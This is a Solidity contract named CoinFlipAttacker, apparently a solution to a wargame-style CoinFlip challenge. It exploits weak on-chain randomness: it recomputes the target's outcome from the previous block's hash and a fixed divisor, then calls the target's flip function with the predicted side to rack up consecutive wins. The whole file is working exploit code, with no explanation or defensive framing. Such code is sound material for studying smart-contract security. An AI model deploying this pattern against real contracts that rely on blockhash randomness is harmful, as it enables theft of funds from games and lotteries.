// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CoinFlip} from "./CoinFlip.sol";

contract CoinFlipAttacker {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    address public targetAddress;

    CoinFlip target;

    constructor() {
        
    }

    function setTarget(address _targetaddress) public {
        targetAddress = _targetaddress;
        target = CoinFlip(targetAddress);
        consecutiveWins = 0 ;
    }

    function flipAttack() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert("Same Block");
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bool result = target.flip(side);
        if (result) {
            consecutiveWins++;
        }

        return result;
    }
}